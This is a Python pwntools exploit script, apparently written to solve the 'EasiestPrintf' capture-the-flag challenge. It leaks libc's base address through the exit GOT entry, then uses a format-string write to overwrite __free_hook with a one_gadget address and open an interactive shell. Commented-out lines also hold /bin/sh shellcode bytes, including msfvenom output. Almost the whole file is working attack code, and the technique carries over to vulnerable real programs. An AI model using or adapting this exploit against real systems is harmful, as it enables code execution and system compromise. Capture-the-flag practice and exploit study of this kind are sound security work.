#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-21 08:29:00
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./EasiestPrintf"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
elf = ELF(target)
libc = ELF("./libc.so.6")
# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)
# libc = ELF[target]
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"

# int 0x80 linux x86 0x1c
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	gdb.attach(p,"b*0x0804881C\nb*0x8048821\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

main_addr = 0x0804882e
exit_plt = elf.symbols["exit"]
exit_got = elf.got["exit"]
bbs_addr = rop.section('.bss')
one_gadget_offset = 0x3E297
free_hook_offset = 0x001a9408

ru("s you wanna read:\n")

sl(str(exit_got))
exit_addr = int(p.recvline()[2:len("0xf75fb1b0")],16)
print "exit_addr=" +hex(exit_addr)

libc_base = exit_addr - libc.symbols["exit"]
one_gadget_addr = libc_base + one_gadget_offset
print "one_gadget_addr="+hex(one_gadget_addr)
free_hook_addr = libc_base+free_hook_offset
print "free_hook_addr="+hex(free_hook_addr)

ru("Good Bye\n")

def exec_fmt(payload):
	p = process(target)
	p.recvuntil("s you wanna read:\n")
	p.sendline(str(exit_got))
	p.recvuntil("Good Bye\n")
	p.sendline(payload)

	return p.recvuntil("\n")

# autofmt = FmtStr(exec_fmt)
offset = 7
def send_payload(payload):
	sl(payload+"%X%100000c")
autofmt = FmtStr(send_payload,offset=offset)

autofmt.write(free_hook_addr,one_gadget_addr)
autofmt.execute_writes()


p.interactive()